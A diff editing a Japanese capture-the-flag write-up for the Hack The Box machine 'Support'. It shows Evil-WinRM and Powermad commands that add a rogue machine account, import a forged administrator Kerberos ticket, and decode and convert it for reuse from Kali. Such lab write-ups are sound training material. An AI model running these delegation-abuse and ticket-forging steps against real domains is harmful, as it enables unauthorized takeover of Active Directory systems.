@@ -185,7 +185,7 @@ bloodhoundの画面が立ち上がったら、ドラッグ＆ドロップで先�
 
 bloodhoundのヘルプにしたがってコマンドを実行する。
 
-```powershell
+```
 *Evil-WinRM* PS C:\Users\support> . .\Powermad.ps1
 *Evil-WinRM* PS C:\Users\support> New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
 [+] Machine account attackersystem added
@@ -261,26 +261,16 @@ cifs/dc.support.htb /ptt
       MjQ4WqYRGA8yMDIyMTAxMDEyNTI0OFqnERgPMjAyMjEwMTcwMjUyNDhaqA0bC1NVUFBPUlQuSFRCqSEw
       H6ADAgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGI=
 [+] Ticket successfully imported!
-
-*Evil-WinRM* PS C:\Users\support> klist
-
-Current LogonId is 0:0xc2535
-
-Cached Tickets: (1)
-
-#0>	Client: administrator @ SUPPORT.HTB
-	Server: cifs/dc.support.htb @ SUPPORT.HTB
-	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
-	Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
-	Start Time: 10/9/2022 19:52:48 (local)
-	End Time:   10/10/2022 5:52:48 (local)
-	Renew Time: 10/16/2022 19:52:48 (local)
-	Session Key Type: AES-128-CTS-HMAC-SHA1-96
-	Cache Flags: 0
-	Kdc Called:
 ```
 
-得られたbase64表示のチケットをKali上にコピーする。その後、base64をデコードしてadmin.kirbiというファイル名で保存する。
+このbase64表示のチケットをtempというファイル名でKali上保存する。
+
+そしたら以下のようにaddmin.kirbiというファイル名で保存する。
+
+```
+┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
+└─$ sed 's/^      //g' temp | tr -d '\n' | base64 -d > admin.kirbi
+```
 
 admin.kirbiをccacheファイルへ変換する。
 
@@ -292,7 +282,7 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 [*] converting kirbi to ccache...
 [+] done
 ```
-環境変数`KRB5CCNAME`に設定する。
+環境変数`KRB5CCNAME`にccacheファイルを設定する。
 ```
 ┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
 └─$ export KRB5CCNAME=admin.ccache 
